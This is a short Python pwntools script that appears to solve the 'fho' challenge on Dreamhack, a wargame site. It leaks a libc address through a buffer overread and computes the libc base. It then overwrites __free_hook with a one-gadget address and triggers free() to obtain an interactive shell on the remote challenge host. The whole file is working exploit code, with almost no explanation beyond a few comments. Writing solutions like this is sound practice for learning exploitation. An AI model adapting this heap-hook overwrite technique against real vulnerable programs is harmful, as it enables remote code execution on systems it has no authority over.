from pwn import *

r = remote("host3.dreamhack.games", 20664)

e = ELF("./fho")
libc = ELF("./libc-2.27.so")

buf = b'A' * 72
r.sendafter("Buf: ", buf)

r.recvuntil(buf)

libc_start_main = r.recvline()
# print(len(libc_start_main)) => /n포함 7 bytes
libc_start_main = libc_start_main[:-1]
libc_start_main += b"\x00" * 2
libc_start_main = u64(libc_start_main)


libc_base = libc_start_main - (libc.symbols["__libc_start_main"] + 231)
free_hook = libc_base + libc.symbols["__free_hook"]
og_exe = libc_base + 0x4f432
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))


# llu *addr = free_hook
# llu value = og_exe
# *free_hook = og_exe
r.sendlineafter("To write: ", str(free_hook))
r.sendlineafter("With: ", str(og_exe))

#r.sendlineafter("To free: ", str(binsh))
r.sendlineafter("To free: ", "sdf")
r.interactive()